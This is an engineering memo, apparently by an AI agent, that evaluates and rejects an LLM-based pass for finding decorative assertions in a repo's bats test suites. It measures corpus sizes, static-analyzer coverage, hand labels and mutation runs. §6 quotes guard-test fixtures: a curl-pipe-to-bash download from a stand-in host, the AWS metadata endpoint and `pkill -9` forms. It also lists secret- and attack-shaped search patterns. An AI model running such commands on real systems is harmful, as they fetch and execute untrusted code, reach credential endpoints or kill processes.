# A6 — Is a batch Jev pass over `tests/*.bats` for decorative assertions a real deliverable?

**VERDICT: NO.** Disqualified on three independent axes, any one of which is sufficient. The
sharpest is not in the brief's refutation list: **mutation is available, deterministic, already this
repo's culture, and ANSWERS the question Jev would only RANK.** A conditional stage-2 salvage is
specified in §9 — it is real, but it is gated on a stage-1 that does not exist yet and does not fit
the window.

All numbers below are measured on this checkout at `5acaeea16` on 2026-09-21. Every command is
given so the figures can be re-derived rather than re-quoted.

---

## 1. Corpus table

```
ls tests/*.bats | wc -l                       → 718 suites
grep -h '^@test' tests/*.bats | wc -l         → 14,693 @test blocks
total @test bytes                             → 10,755,290  (10.3 MiB)
```

Per-block size, blocks delimited `@test` → next `@test`:

| stat | bytes | est. tokens (bytes ÷ 3.6) |
|---|---|---|
| min | 20 | 6 |
| p50 | 526 | 146 |
| p75 | 855 | 238 |
| p90 | 1,428 | 397 |
| p95 | 1,988 | 552 |
| p99 | 3,674 | 1,021 |
| **max** | **16,580** | **~4,606** |
| mean | 732 | 203 |

**The 32k-token state ceiling is NOT the binding constraint for a test-alone judgment.** The
library's own mechanical bound is `CC_JEV_MAX_STATE_B=24000` **bytes** (`hooks/lib/jev.sh:81`,
enforced at `:141` returning `{"ok":false,"reason":"oversize"}`). The largest block in the corpus is
16,580 B — **0 of 14,693 blocks exceed the byte cap**, with ~31% headroom on the worst case. Brief
refutation (c) is **REFUTED for the test alone**.

**Refutation (c) HOLDS for a subject-inclusive judgment**, and decisively:

```
wc -c scripts/handoff-fire.sh   → 947,997 B     (39× the 24,000 B cap)
wc -c scripts/ship-land.sh      → 390,892 B     (16× the cap)
```

A test + its subject cannot be co-resident for the two largest subjects in the repo, which are also
the two with the most test coverage (`ship-land.bats` 177 blocks, and `postland-verify.bats` 152
blocks judges `ship-land` behaviour). Any question requiring the subject's source is unanswerable as
posed. This matters because the residual class Jev would be aimed at — *"is this assertion's outcome
determined by the fixture rather than the subject?"* — is precisely the one where the subject's
behaviour is the missing term.

### Only 1.8% of blocks exceed the proven caller's excerpt cap

`scripts/jev/rank-memory.sh` uses `CC_JEV_RANK_CAP_B=3000`. At that cap, **263 of 14,693 blocks
(1.8%) would be truncated.** Truncation is not neutral here: `bats-assert-liveness.py`'s whole thesis
is that deadness is a function of **block position**, so a block truncated before its final statement
loses exactly the term the judgment turns on. A stage-2 caller must raise the cap to ~17,000 B rather
than inherit 3,000.

---

## 2. What the existing static check already catches — MEASURED

**The repo has a purpose-built analyzer and it is in the land gate.**

`scripts/bats-assert-liveness.py` — 717 lines. Four construct classes (source, lines 60-67):

| class | construct | why dead |
|---|---|---|
| `cond-keyword` | `[[ ... ]]` non-final | bash keyword, exempt from `errexit` |
| `arith` | `(( ... ))` non-final | compound command, exempt from `errexit` |
| **`negation`** | **`! cmd` non-final** | **status inverted, exempt from `errexit`** |
| `and-absorbed` | `assertion && ...` non-last element | status absorbed by the AND-OR list |

Measured run over the whole corpus:

```
$ time python3 scripts/bats-assert-liveness.py --summary
── 0 dead assertion(s) in 0 of 718 file(s)
3.72s user  0.12s system  →  5.6s wall
RC=0
```

**Zero findings across 718 files, in 5.6 seconds.**

### 🚨 The brief's premise about the `!` class is FALSE — correct the wave's record

The brief states: *"Negated assertion dead unless final (`! cmd` mid-test always passes under
errexit, **and the repo's own liveness analyzer does not flag it**)."*

It does flag it. `CLASS_NEG = "negation"` is one of the four classes, matched by
`RE_NEG = re.compile(r"^!\s+\S")` (line 70-72, with a deliberate whitespace requirement so `!=` and
`!$` never match). What the lesson actually says is that **shellcheck** does not flag classes 1 and 2
at all and covers only *some* `!` uses via SC2251 — *"which is why this analyzer exists"* (module
docstring, lines 14-16). The brief transposed "shellcheck misses it" into "our analyzer misses it."
That transposition is the entire load-bearing premise for the candidate, and it does not survive
reading the file.

### It is wired into the land gate, with a fixer and a non-verdict arm

```
scripts/ship-land.sh:3721   DEAD_LINT="${SHIP_LAND_DEAD_LINT:-scripts/bats-assert-liveness.py}"
scripts/ship-land.sh:3710   # …only as tests/bats-assert-liveness.bats, which is REPO-WIDE: one
                            #   non-final `[[ ]]` from any file blocks the land
scripts/ship-land.sh:3775   echo "  Revive it:  python3 scripts/bats-assert-liveness-fix.py <file>"
scripts/ship-land.sh:3786   arm_nonverdict "bats-assert-liveness" …
scripts/gate-select.sh:129  LIVENESS_SUITE = "tests/bats-assert-liveness.bats"
```

So the zero is not luck — it is a **ratchet held at zero by a blocking gate**, with an automated
repair path and an explicit non-verdict arm for the could-not-run case (exit 2). The analyzer is also
calibrated to the *weaker* bash (3.2) rather than whichever bash the runner resolves, and its suite
pins both arms of the version grid.

### Seven sibling ratchets already cover adjacent decorative classes

| script | class it ratchets |
|---|---|
| `bats-testname-eval-lint.sh` | shell expansion inside an `@test` name (bats `eval`s descriptions) |
| `bats-shellcheck-lint.sh` | shellcheck on `.bats`, which the land gate's `is_shell_file()` never matched |
| `moving-ref-control-lint.sh` | pre-fix controls replayed from a **moving** git ref (control rots silently) |
| `test-hermeticity-lint.sh` | suites that do not fixture `$HOME` (read/mutate live operator state) |
| `bats-kill-guard-lint.sh` | unscoped kill patterns in suites |
| `bats-shim-parity-lint.sh` | shim/subject drift |
| `test-walltime-lint.sh`, `test-afunix-path-lint.sh` | runtime and socket-path hygiene |

### And 23% of suites already carry a hand-run mutation proof

```
grep -rl 'RED.PROOF' tests/*.bats | wc -l   →  165   (23.0% of 718)
grep -rln 'RED-PROOF\|red-proof\|redproof' tests/*.bats | wc -l  →  194  (27.0%)
```

`tests/cc-limited-reaper.bats` is typical: it embeds the verbatim TAP output of the whole suite run
against a pristine pre-fix subject via `CC_LIMITED_BIN`, all 10 rows `not ok`. **The repo's authors
already do mutation by hand and record the receipt in the file.**

**Brief refutation (a) — "a static analyzer already catches it" — HOLDS**, more strongly than the
brief anticipated: not one analyzer but a family of eight, one of which blocks the land and is held
at 0/718.

---

## 3. Hand-labels — 28 blocks, base rate ≈ 0

Two samples. Sample A: 20 uniformly random blocks (`random.seed(20260921)`). Sample B: 8 blocks drawn
from the `no run` residual (§4), the population most likely to be decorative.

Rubric = the brief's three decomposed questions. **DECORATIVE** = no assertion in the block can fail
for any behaviour of the subject.

### Sample A (20 random)

| # | block | label | note |
|---|---|---|---|
| 1 | `worker-claim-gate-coverage.bats:337` | LIVE (weak: source-text) | asserts by `grep -q` on `$HOOK` **source**, not behaviour |
| 2 | `cc-reaper.bats:1472` | LIVE | `run "$R" sweep --reap`, status + subject-written `idl.jsonl` |
| 3 | `bats-assert-liveness.bats:108` | LIVE | runs bats under two bash versions, asserts opposite statuses |
| 4 | `cc-lr.bats:270` | LIVE (weak: source-text) | `! grep … \|\| false` on `$FIND` source — correct revival idiom |
| 5 | `cc-authbrowser.bats:575` | LIVE | three `run`s, each `status -eq 2` |
| 6 | `test-hermeticity-lint.bats:1009` | LIVE | builds fixture suite, runs the lint on it |
| 7 | `bats-shortfall-nonverdict.bats:137` | LIVE | 3 near-miss TAP fixtures, asserts count `= 2` |
| 8 | `watchdog-census.bats:157` | LIVE | stubbed `ps`, asserts class discrimination both ways |
| 9 | `postland-verify.bats:2799` | LIVE | asserts page ordering `confirm:` < `do:` |
| 10 | `cc-dispatch-projects.bats:313` | LIVE | 4 assertions incl. `spawns -eq 0` + reopen row |
| 11 | `deploy-live.bats:3171` | LIVE | `[ -L "$DEST" ]` and `[ ! -L "$ODEST" ]` — both directions in one block |
| 12 | `config-mirror-isolate.bats:101` | LIVE (final stmt is `return 0`) | **question (c) would FALSE-POSITIVE here**; the loop uses explicit `return 1` |
| 13 | `cc-limited-reaper.bats:185` | LIVE | + the file carries a full red-proof TAP receipt |
| 14 | `postland-verify.bats:4097` | LIVE | asserts the fixture reaches its regime (`norm -ge 60000`) before the claim |
| 15 | `completion-assert.bats:434` | LIVE (weak: abstain-only) | `status 0` + `-z "$output"`; paired D1 arms are the positive control |
| 16 | `comms-drain-activate.bats:221` | LIVE (weak: absence-only) | `[ ! -e … ]` — would pass for a no-op subject |
| 17 | `capacity-marginal-run.bats:294` | LIVE | `status -eq 2` on a non-integer window |
| 18 | `curl-gate-redirect.bats:193` | LIVE | three `-z "$output"` + one positive `grep` |
| 19 | `chromium-bundle-lint.bats:68` | LIVE (weak: green-only) | equivalence guard; needs the paired RED case |
| 20 | `pkill-scope.bats:268` | LIVE | four `decision … = DENY` |

### Sample B (8 from the `no run` residual)

`handoff-fire-live-subagents:183`, `cc-permission-harvest-apply:513`,
`install-templatedir-home-guard:154`, `teammate-auto-shutdown:966`, `cc-backlog-add-update:208`,
`cc-blockers:275`, `permission-denied:236`, `cc-classify:849` — **all LIVE.** Every one invokes the
subject through a *helper wrapper* (`fire`, `falsify`, `install_fixture`, `_close_run`, `cause`,
`kinds`) that contains the `run` internally. The weakest is `permission-denied:236`
(`[ -x "$HOOK" ]` + shebang grep) which is a genuine smoke assertion, not a tautology.

### Base rate

```
DECORATIVE: 0 / 28        →  0.0%
```

With zero events in n=28, the rule of three gives a **95% upper bound of 10.7%** — and that bound is
pessimistic because the two strata were deliberately chosen to enrich for the defect.

**Brief refutation (b) — "base rate near 0 or 1" — HOLDS.** Inert by construction: a ranker over a
population with ~0 positives ranks noise. The brief's own framing anticipated this and it is what the
data says.

**Weak-but-live classes DO exist at ~25%** (5/20: source-text ×2, absence-only, green-only,
abstain-only). That is a different and much less valuable question than "cannot fail," and §5 shows
those are covered by paired arms.

---

## 4. Cheap static prefilters — measured and REFUTED

The obvious way to shrink 14,693 into a Jev-affordable population:

| signal | population | verdict |
|---|---|---|
| block contains no `run ` anywhere | **3,132 (21.3%)** | **useless** — sample B shows ~all are helper-wrapped `run`s |
| block contains no assertion-shaped line | 561 (3.8%) | unexamined; likely pure-helper blocks |

The `no run` filter has an ~8/8 false-positive rate in the sample. It cannot carry a prefilter.
This matters: **without a working static prefilter there is no affordable population**, which is what
forces the full-corpus call budget in §7.

---

## 5. Mutation results — the ground truth, 0 Jev calls, completed today

Method: `tar`-copied the working tree (155 MB, no `.git`) to scratch; ran each suite to establish a
**green baseline in the copy**; then inserted `exit 0` immediately after the subject's shebang (a
no-op subject) and re-ran. Restored between arms. **The real checkout was never written to**
(`git status --porcelain` shows only this untracked research dir).

Two suites were discarded for baseline reds in the copy (`pkill-scope` 1, `worker-claim-gate-coverage`
5) — path-bound to the live layer, so the copy is not a valid arm for them. Replaced with
green-baseline suites.

### Arm 1 — subject is a no-op (`exit 0`)

| suite | subject mutated | died / total | suite red? |
|---|---|---|---|
| `chromium-bundle-lint` | `scripts/chromium-bundle-lint.sh` | 3 / 10 | ✅ YES |
| `curl-gate-redirect` | `hooks/curl-gate.py` | 12 / 18 | ✅ YES |
| `comms-drain-activate` | `docs/activation/pending-activation/07-comms-drain-activate.sh` | 11 / 16 | ✅ YES |
| `capacity-marginal-run` | `scripts/capacity-marginal-run.sh` | **15 / 15** | ✅ YES |
| `cc-authbrowser` | `bin/cc-authbrowser` | 37 / 41 | ✅ YES |
| **total** | | **78 / 100 (78%)** | **5 / 5** |

**Suite-level detection is 5/5.** Per-test, 22 blocks survived a subject that does nothing.

### 🚨 My hand-labels PREDICTED the survivors

Sample 19 (`chromium-bundle-lint.bats:68`, labeled *green-only equivalence guard*) — **survived**.
Sample 16 (`comms-drain-activate.bats:221`, labeled *absence-only*) — **survived**.
Sample 18 (`curl-gate-redirect.bats:193`, labeled LIVE) — **died**.
Sample 17 (`capacity-marginal-run.bats:294`, labeled LIVE) — **died**.

The rubric works. It is also cheap enough that a human or a Claude turn applies it directly.

### Arm 2 — complementary mutation: `chromium-bundle-lint.sh` always fires (`exit 1`)

```
died 7/10
   not ok 2 --selftest passes (the detector still discriminates)
   not ok 3 the tree as it stands is GREEN (a standing-red lint is rot)
   not ok 4 RED: the real scar shape fires
   not ok 5 GREEN: the remedy does not fire (the lint must not reject its own fix)
   not ok 6 GREEN: the chrome-headless-shell binary does not fire     ← survived arm 1
   not ok 7 a NON-VERDICT is loud: an unusable scan root exits 2, never a clean 0
   not ok 8 own-scope: a finding outside this land's diff is advisory, inside it blocks
```

**All three arm-1 survivors died in arm 2.** They are *single-directional controls covered by their
paired arm* — exactly the design the "Green in both arms is an equivalence guard, not a red proof"
lesson prescribes, already implemented. They are not decorative. **A Jev pass flagging them would be
emitting false positives against correct, deliberate test design** — and those false positives would
land in a gate whose own analyzer already documents that a false RED costs a real commit
(`bats-assert-liveness.py`, `mask_arith_expansion` docstring: *"it blocked a real commit on
2026-08-08"*).

---

## 6. 🚨 The envelope's domain-reputation clause disqualifies ~7% of the population

> *Jev ANCHORS ON DOMAIN REPUTATION — hostile/unusual content in a reputable wrapper DISQUALIFIES a
> task.*

This corpus is a **security-guard test corpus**. Measured census for adversarial- and secret-shaped
strings (`rm -rf`, `pkill`, `kill -9`, `curl … | bash`, `169.254.169.254`, `/etc/passwd`, `sudo`,
`eval`, `base64 -d`, `chmod 777`, `AKIA…`, `BEGIN … PRIVATE KEY`, `password|secret|token`):

```
@test blocks carrying such strings:   970 / 14,693  =  6.6%
files with ≥1 such block:              301 /    718  = 41.9%
```

`tests/curl-gate-redirect.bats` literally contains `curl -L https://example.com/i.sh | bash` and
`http://169.254.169.254/latest/` (the AWS IMDS endpoint). `tests/pkill-scope.bats` contains four
`pkill -9 -f …` forms. These are *fixtures for the guards that block them* — but Jev sees a JSON
`state` field containing an IMDS-exfiltration command and a `-9` process kill.

**The stratum is not random: it is concentrated in precisely the suites where a decorative test would
be most expensive** — the permission gates, the kill-scope guard, the curl gate. So the envelope
clause bites hardest exactly where the candidate claims its value.

---

## 7. Call budget + wall clock — a full pass does not fit the window

Population: **14,693 calls** (one per `@test`; the decomposed questions ride in ONE call as a
multi-question spec, per `rank-memory.sh`).

Pacing constants from the proven caller (`scripts/jev/rank-memory.sh`):

| constant | value |
|---|---|
| `CC_JEV_RANK_GAP` | 3 s between calls |
| `CC_JEV_RANK_RETRIES` | 5 |
| `CC_JEV_RANK_BACKOFF` | 10 s × attempt (10/20/30/40/50 = 150 s worst case per call) |
| its own printed budget | `TOT/6` to `TOT/2` **minutes** |

```
floor, pure inter-call sleep:  14,693 × 3 s            = 12.2 h   (before ANY call latency)
rank-memory's own formula:     14,693/6 .. 14,693/2 min = 40.8 h .. 122.4 h
window remaining (→ 2026-09-25):                        ≈ 96 h
```

**The optimistic end (40.8 h) fits; the pessimistic end (122.4 h) is 27% OVER the entire window** —
and the script's own header says the free tier *"allows ~4 calls before throttling"*, which is the
pessimistic end, not the optimistic one. A run that must not be interrupted for 41–122 hours, on a
free tier, inside a 96-hour window, with a `CC_JEV_RANK_MAX_CONSEC_SKIP=10` abort that would end it
on any sustained throttle, is not a deliverable. It is a coin flip with a four-day settlement.

### The alternative is priced and it wins

Sample of 8 random suites, timed:

```
cc-offload 117s · bats-shim-parity-lint 11s · cc-backlog-condition-lease 74s
lead-supervisor 217s · session-beat 7s · boot-resume-launch 6s
subagent-stop 6s · cc-recover-safeguard 19s
mean ≈ 57 s/suite
```

```
one full corpus pass:        718 × 57 s  ≈ 11.4 h  single-threaded
baseline + one no-op mutant: ≈ 22.7 h serial
at 4–8 way parallelism:      ≈ 3 – 6 h
```

**A two-arm mutation sweep is ~4–10× faster than the Jev pass, is deterministic, is re-runnable, has
no third-party dependency, no retention question, no rate limit, and produces an ANSWER (`this test
did not die`) rather than a RANK (`this test looks suspicious`).** Every one of the eight lessons the
brief cites was found by exactly this method.

---

## 8. Refutation scorecard

| # | brief's refutation | verdict | evidence |
|---|---|---|---|
| (a) | a static analyzer already catches it | ✅ **HOLDS** | `bats-assert-liveness.py`, 4 classes incl. `!`, **0 findings / 718 files in 5.6 s**, wired at `ship-land.sh:3721`, + 7 sibling ratchets, + 165 suites with hand-run red-proofs |
| (b) | base rate near 0 or 1 | ✅ **HOLDS** | 0 / 28 hand-labeled decorative; 95% upper bound 10.7%; no working static prefilter (the 21.3% `no run` signal is ~all false positives) |
| (c) | judgment needs the subject and the pair blows 32k | ⚠️ **SPLIT** | test-alone: **REFUTED** (max block 16,580 B vs 24,000 B cap, 0 blocks over). test+subject: **HOLDS** (`handoff-fire.sh` 948 KB = 39× the cap) |
| (d) | it needs a string back | ❌ **does not hold** | `choice` over ordered keys carries the rank fine, as `rank-memory.sh` proves |
| **(e)** | **[not in brief] mutation is cheaper and ANSWERS** | ✅ **DECISIVE** | 5 suites mutated today, 0 Jev calls, 78/100 tests died, **5/5 suites red**; full 2-arm sweep 3–6 h parallel vs 41–122 h |
| **(f)** | **[not in brief] hostile-content stratum** | ✅ **HOLDS** | 6.6% of blocks / 41.9% of files carry adversarial strings, concentrated in the highest-value suites |

---

## 9. The honest salvage — Jev as STAGE 2, never stage 1 (conditional, NOT recommended this window)

There is one class neither instrument reaches: **a test that survives BOTH mutation arms because
every assertion reads a fixture the test itself wrote.** Mutation identifies the *population*
(survivors) but cannot distinguish "correct single-directional control" from "tautology" — that
distinction is semantic, and it is the one thing Jev could genuinely add.

**The shape, if a 2-arm sweep is ever built:**

1. **Stage 1 (deterministic, 3–6 h parallel):** two-arm mutation sweep. Emit every `@test` that
   survived *both* arms. Extrapolating this sample's 22% arm-1 survival and arm-2's
   full kill of those survivors, the both-arms-survivor population is plausibly **O(100–500)**, not
   14,693.
2. **Stage 2 (Jev, 100–500 calls = 17 min – 4.2 h):** rank only the survivors. **In budget.**
3. Raise `CC_JEV_RANK_CAP_B` from 3,000 to **17,000** (§1) or 1.8% of blocks lose their final
   statement — the term the judgment turns on.
4. **Exclude the 6.6% hostile-content stratum by regex before sending** (§6).

### Literal `instructions` / `criteria` for stage 2

```json
{
  "state": "<the full @test block, ≤17000 B, hostile-stratum excluded>",
  "questions": {
    "subject_dependent": {
      "type": "boolean",
      "instructions": "This is one test case from a bash test suite. Ignoring every comment, could the outcome of at least one of its assertions differ depending on how the program under test behaves? Answer false if every assertion only ever reads a value that this test case itself wrote, computed, or stubbed.",
      "criteria": {
        "true": "at least one assertion reads an exit status, an output stream, or a file produced by the program under test",
        "false": "every assertion reads only a literal, a variable this test assigned, or a file this test created — the program under test could do anything and the result would not change"
      }
    },
    "direction": {
      "type": "choice",
      "instructions": "Which outcomes of the program under test would make this test case FAIL? Judge only what is asserted, never what the test name promises.",
      "criteria": {
        "neither": "no behaviour of the program under test can make this fail",
        "absence-only": "it only asserts that something did NOT happen — a no-op program would pass it",
        "presence-only": "it only asserts that something DID happen — a program that always acts would pass it",
        "both": "it asserts in both directions, so both an inert and an over-eager program fail it"
      }
    },
    "final_is_assertion": {
      "type": "boolean",
      "instructions": "Is the last executed statement of this test body an assertion, rather than cleanup, a return, or fixture teardown?",
      "criteria": {
        "true": "the body ends on a check whose failure would fail the test",
        "false": "the body ends on cleanup, an unconditional `return 0`, or a fixture write"
      }
    }
  }
}
```

### Caller-side rule (ordering lives here, never in the model)

```
risk = 0
if subject_dependent.probability < 0.10      : risk += 100   # the only true "cannot fail"
if direction.choice == "neither"             : risk += 100
if direction.choice in (absence-only,
                        presence-only)       : risk +=  20   # weak, NOT decorative — §5 arm 2
if final_is_assertion.probability < 0.10     : risk +=   5   # noisy: FALSE-POSITIVES on the
                                                             # `return 0` idiom (sample 12)
rank descending; act only on risk >= 100.
```

The `>= 100` floor is the point of the whole rule. `direction != both` is a ~25% base-rate signal
(§3) that arm 2 proved **benign** (§5); promoting it to an action would flood a gate that the
analyzer's own history says cannot absorb false REDs. Only `subject_dependent = false` is the defect
the brief is hunting, and it is the one with a measured base rate of **zero**.

### 🚨 Why this is NOT recommended for this window

Stage 1 does not exist. Building a two-arm mutation sweep — subject attribution per suite, a green
baseline in an isolated tree, per-suite red/green bookkeeping, parallel scheduling, and handling the
path-bound suites that fail in a copy (2 of my first 7) — is itself the deliverable, and it is a
deliverable **whose value does not depend on Jev at all.** If four days are spent here, spend them on
stage 1. Stage 2 is an hour of calls afterwards, in any window.

---

## 10. THE TEST: would we notice its absence?

**No.** The absence of a Jev ranking over `tests/*.bats` is currently indistinguishable from its
presence, because:

- the syntactic classes are held at **0/718 by a blocking land gate** that runs in 5.6 s;
- the semantic class has a measured base rate of **0/28**;
- the one instrument that *would* find a new instance — mutation — is **already the repo's
  documented practice in 165 of 718 suites** and is 4–10× cheaper than the Jev pass;
- and 6.6% of the population is disqualified by the envelope's own domain-reputation clause,
  concentrated in the suites that matter most.

What we *would* notice is the absence of **stage 1**: nothing in this repo runs a systematic
two-arm mutation sweep. That is the real gap this investigation surfaced, it is buildable, it is
deterministic, and it needs zero Jev calls.

---

## 11. Method notes / residuals, stated rather than hidden

- **Hand-labeling was done by the same agent that designed the rubric.** n=28 is small and the labels
  are mine. The mutation arm is the independent check, and it agreed on 4/4 blocks where both
  instruments had an opinion — but 4 is not a validation set.
- **Two of my first seven suites carried baseline reds in the scratch copy** (`pkill-scope`,
  `worker-claim-gate-coverage`) because they are path-bound to the live `~/.claude` symlink layer.
  I discarded and replaced them rather than reading their reds as findings. Any stage-1 sweep must
  handle this class explicitly — a suite that is red in the copy produces no mutation verdict, and
  counting it as "died" would manufacture coverage. I did not measure how large that class is; it is
  the largest unmeasured term in the §7 price.
- **The 57 s/suite mean is n=8 with a 6–217 s range**, so the ±  on the 11.4 h figure is wide.
  Re-derive with a full timed pass before committing to a schedule.
- **I could not make a single Jev call** (`CC_JEV_ZDR=0` is classifier-refused for the agent), so
  every claim about Jev's *behaviour* on this corpus is inference from `hooks/lib/jev.sh` and
  `scripts/jev/rank-memory.sh`, not measurement. The claims about the *corpus* are all measured.
- **The `no run` prefilter was refuted on an 8-block sample.** If a stage-1 sweep is built, that
  refutation should be re-checked at larger n before the signal is discarded permanently.

### Re-derive everything here

```bash
cd ~/Development/claude-infrastructure
python3 scripts/bats-assert-liveness.py --summary          # the 0/718
grep -rl 'RED.PROOF' tests/*.bats | wc -l                  # the 165
grep -n 'DEAD_LINT' scripts/ship-land.sh                   # the gate wiring
grep -n 'CC_JEV_MAX_STATE_B' hooks/lib/jev.sh              # the 24,000 B cap
```
